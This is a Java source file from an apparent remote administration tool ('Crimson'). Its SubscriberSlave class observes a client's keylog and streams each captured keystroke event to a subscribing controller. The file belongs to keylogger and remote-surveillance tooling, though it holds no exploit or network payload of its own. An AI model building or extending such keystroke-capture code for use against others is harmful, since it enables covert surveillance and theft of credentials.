/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.core.stream.subscriber;

import java.util.Observable;
import java.util.Observer;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.core.store.LcvidStore;
import com.subterranean_security.crimson.core.stream.Stream;
import com.subterranean_security.crimson.core.util.IDGen;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.EV_KEvent;
import com.subterranean_security.crimson.proto.core.net.sequences.MSG.Message;
import com.subterranean_security.crimson.proto.core.net.sequences.Stream.Param;
import com.subterranean_security.crimson.proto.core.net.sequences.Stream.SubscriberParam;
import com.subterranean_security.crimson.server.store.ServerProfileStore;
import com.subterranean_security.crimson.sv.keylogger.Log;
import com.subterranean_security.crimson.sv.profile.ClientProfile;

public class SubscriberSlave extends Stream implements Observer {

	private static final Logger log = LoggerFactory.getLogger(SubscriberSlave.class);

	public SubscriberSlave(Param p) {
		super(p, p.getMasterID());
		start();
	}

	public SubscriberSlave(SubscriberParam sp) {
		this(Param.newBuilder().setSubscriberParam(sp).setStreamID(IDGen.stream()).setMasterID(LcvidStore.cvid)
				.build());
	}

	@Override
	public void start() {

		if (param().getSubscriberParam().getKeylog()) {
			ClientProfile cp = ServerProfileStore.getClient(param().getSlaveID());

			if (cp != null) {
				cp.getKeylog().addObserver(this);
			} else {
				stop();
			}
		}

	}

	@Override
	public void stop() {
		if (param().getSubscriberParam().getKeylog()) {
			ClientProfile cp = ServerProfileStore.getClient(param().getSlaveID());

			if (cp != null) {
				cp.getKeylog().deleteObserver(this);
			}
		}
	}

	@Override
	public void update(Observable arg0, Object arg1) {
		if (arg0 instanceof Log) {
			EV_KEvent ev = (EV_KEvent) arg1;
			write(Message.newBuilder().setEvKevent(ev).setSid(param().getSlaveID()));
		}

	}

	@Override
	public void received(Message m) {
		// TODO Auto-generated method stub
	}

}
